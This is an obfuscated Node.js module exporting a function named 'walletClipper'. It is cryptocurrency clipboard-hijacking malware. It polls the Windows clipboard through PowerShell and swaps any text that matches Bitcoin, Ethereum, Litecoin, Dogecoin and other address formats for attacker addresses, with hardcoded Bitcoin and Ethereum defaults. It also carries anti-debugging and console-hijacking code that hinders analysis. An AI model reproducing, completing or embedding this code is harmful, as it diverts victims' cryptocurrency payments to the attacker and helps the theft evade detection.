const _0x127396 = (function () {
    let _0x2bf171 = true
    return function (_0x46d148, _0xd06d6a) {
      const _0x12342c = _0x2bf171
        ? function () {
            if (_0xd06d6a) {
              const _0x272192 = _0xd06d6a.apply(_0x46d148, arguments)
              return (_0xd06d6a = null), _0x272192
            }
          }
        : function () {}
      return (_0x2bf171 = false), _0x12342c
    }
  })(),
  _0x30619c = _0x127396(this, function () {
    return _0x30619c
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x30619c)
      .search('(((.+)+)+)+$')
  })
_0x30619c()
const _0x479792 = (function () {
  let _0x4bc4f3 = true
  return function (_0x306d81, _0x25f075) {
    const _0x47a4d2 = _0x4bc4f3
      ? function () {
          if (_0x25f075) {
            const _0x3ca1a8 = _0x25f075.apply(_0x306d81, arguments)
            return (_0x25f075 = null), _0x3ca1a8
          }
        }
      : function () {}
    return (_0x4bc4f3 = false), _0x47a4d2
  }
})()
;(function () {
  _0x479792(this, function () {
    const _0x19c5bb = new RegExp('function *\\( *\\)')
    const _0x583e70 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x438a30 = _0xda6efa('init')
    !_0x19c5bb.test(_0x438a30 + 'chain') || !_0x583e70.test(_0x438a30 + 'input')
      ? _0x438a30('0')
      : _0xda6efa()
  })()
})()
const _0xc52565 = (function () {
    let _0x234055 = true
    return function (_0x82d6da, _0x260d1a) {
      const _0x36ad7d = _0x234055
        ? function () {
            if (_0x260d1a) {
              const _0x9e7724 = _0x260d1a.apply(_0x82d6da, arguments)
              return (_0x260d1a = null), _0x9e7724
            }
          }
        : function () {}
      return (_0x234055 = false), _0x36ad7d
    }
  })(),
  _0x583774 = _0xc52565(this, function () {
    const _0xcd6304 = function () {
      let _0x4af8c1
      try {
        _0x4af8c1 = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x3a45a3) {
        _0x4af8c1 = window
      }
      return _0x4af8c1
    }
    const _0x66ba49 = _0xcd6304()
    const _0x5e7cee = (_0x66ba49.console = _0x66ba49.console || {}),
      _0x1dc160 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x87fd4d = 0; _0x87fd4d < _0x1dc160.length; _0x87fd4d++) {
      const _0x531d71 = _0xc52565.constructor.prototype.bind(_0xc52565),
        _0x44ef53 = _0x1dc160[_0x87fd4d],
        _0xc74231 = _0x5e7cee[_0x44ef53] || _0x531d71
      _0x531d71['__proto__'] = _0xc52565.bind(_0xc52565)
      _0x531d71.toString = _0xc74231.toString.bind(_0xc74231)
      _0x5e7cee[_0x44ef53] = _0x531d71
    }
  })
_0x583774()
const _0x34de9a = require('child_process')
class _0xd25d0c {
  constructor(_0x3a7602, _0x9d9e8c) {
    this.adress = _0x3a7602
    this.regex = _0x9d9e8c
  }
}
function _0x511930(_0x4f5597) {
  if (_0x4f5597.active != 'yes') {
    return
  }
  const _0x4cbdda = [
    new _0xd25d0c(
      _0x4f5597.btc_address || 'bc1qry8mepyxlz4vfhna4mvwnjzvkmh0lxyehw0d0g',
      new RegExp('^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$')
    ),
    new _0xd25d0c(
      _0x4f5597.ltc_address || '',
      new RegExp('(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)')
    ),
    new _0xd25d0c(
      _0x4f5597.xlm_address || '',
      new RegExp('(?:^G[0-9a-zA-Z]{55}$)')
    ),
    new _0xd25d0c(
      _0x4f5597.xrp_address || '',
      new RegExp('(?:^r[0-9a-zA-Z]{24,34}$)')
    ),
    new _0xd25d0c(
      _0x4f5597.bch_address || '',
      new RegExp('^((bitcoincash:)?(q|p)[a-z0-9]{41})')
    ),
    new _0xd25d0c(
      _0x4f5597.dash_address || '',
      new RegExp('(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)')
    ),
    new _0xd25d0c(
      _0x4f5597.neo_address || '',
      new RegExp('(?:^A[0-9a-zA-Z]{33}$)')
    ),
    new _0xd25d0c(
      _0x4f5597.doge_address || '',
      new RegExp('D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}')
    ),
    new _0xd25d0c(
      _0x4f5597.eth_address || '0x4D1120F2eC332B5842BF53Be4B2B1E3691ebFee0',
      new RegExp('(?:^0x[a-fA-F0-9]{40}$)')
    ),
  ]
  while (true) {
    try {
      const _0x147d91 = _0x34de9a
        .execSync('powershell Get-Clipboard')
        .toString('utf8')
        .replace('\r', '')
      let _0x15e155 = _0x147d91,
        _0x527dc5 = false
      for (let _0x2e4419 = 0; _0x2e4419 < _0x4cbdda.length; _0x2e4419++) {
        const _0x38b90f = _0x4cbdda[_0x2e4419]
        for (let _0x279426 of _0x15e155.split('\n')) {
          if (_0x279426 == _0x38b90f.adress) {
            break
          }
          _0x38b90f.regex.test(_0x279426.replace('\r', '')) &&
            ((_0x527dc5 = true),
            (_0x15e155 = _0x15e155.replace(_0x279426, _0x38b90f.adress)))
        }
        _0x527dc5 && _0x34de9a.execSync('powershell Set-Clipboard ' + _0x15e155)
      }
    } catch (_0x5c946c) {}
  }
}
module.exports = { walletClipper: _0x511930 }
function _0xda6efa(_0x1bfa68) {
  function _0x399d05(_0x2f9b52) {
    if (typeof _0x2f9b52 === 'string') {
      return function (_0x34d55e) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x2f9b52 / _0x2f9b52).length !== 1 || _0x2f9b52 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x399d05(++_0x2f9b52)
  }
  try {
    if (_0x1bfa68) {
      return _0x399d05
    } else {
      _0x399d05(0)
    }
  } catch (_0x57f9cf) {}
}
